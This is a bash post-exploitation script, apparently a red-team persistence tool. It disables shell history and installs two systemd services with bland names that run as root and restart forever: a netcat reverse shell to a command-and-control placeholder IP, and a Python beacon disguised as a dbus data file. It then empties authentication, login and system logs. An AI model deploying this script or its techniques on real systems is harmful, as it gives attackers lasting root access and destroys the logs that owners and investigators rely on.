#!/bin/bash
# setup_services.sh - Run as root: sudo bash setup_services.sh

# ── Suppress History ───────────────────────────────────────────
export HISTSIZE=0
unset HISTFILE

# ── BSA Service (netcat reverse shell) ────────────────────────
cat <<EOL > /etc/systemd/system/bsa.service
[Unit]
Description=BSA Service
After=network.target
StartLimitBurst=1000
StartLimitIntervalSec=10

[Service]
Type=simple
Restart=always
RestartSec=1
User=root
ExecStart=/usr/bin/nc -c sh <C2_BOX_IP> 9001

[Install]
WantedBy=multi-user.target
EOL

systemctl start bsa
systemctl enable bsa

# ── POP Service (python beacon) ────────────────────────────────
cat <<EOL > /etc/systemd/system/pop.service
[Unit]
Description=POP Service
After=network.target
StartLimitBurst=1000
StartLimitIntervalSec=10

[Service]
Type=simple
Restart=always
RestartSec=1
User=root
ExecStart=/usr/bin/env python3 /var/lib/dbus/wicd.dat -t <Target_IP>

[Install]
WantedBy=multi-user.target
EOL

systemctl start pop
systemctl enable pop

# ── Reload systemd ─────────────────────────────────────────────
systemctl daemon-reload

# ── Clear Logs ─────────────────────────────────────────────────
for log in /var/log/auth.log /var/log/lastlog /var/log/wtmp /var/log/btmp /var/log/syslog /var/log/faillog /var/log/daemon.log /var/log/user.log; do
    [ -f "$log" ] && cat /dev/null > "$log"
done

echo "[+] Services setup complete."
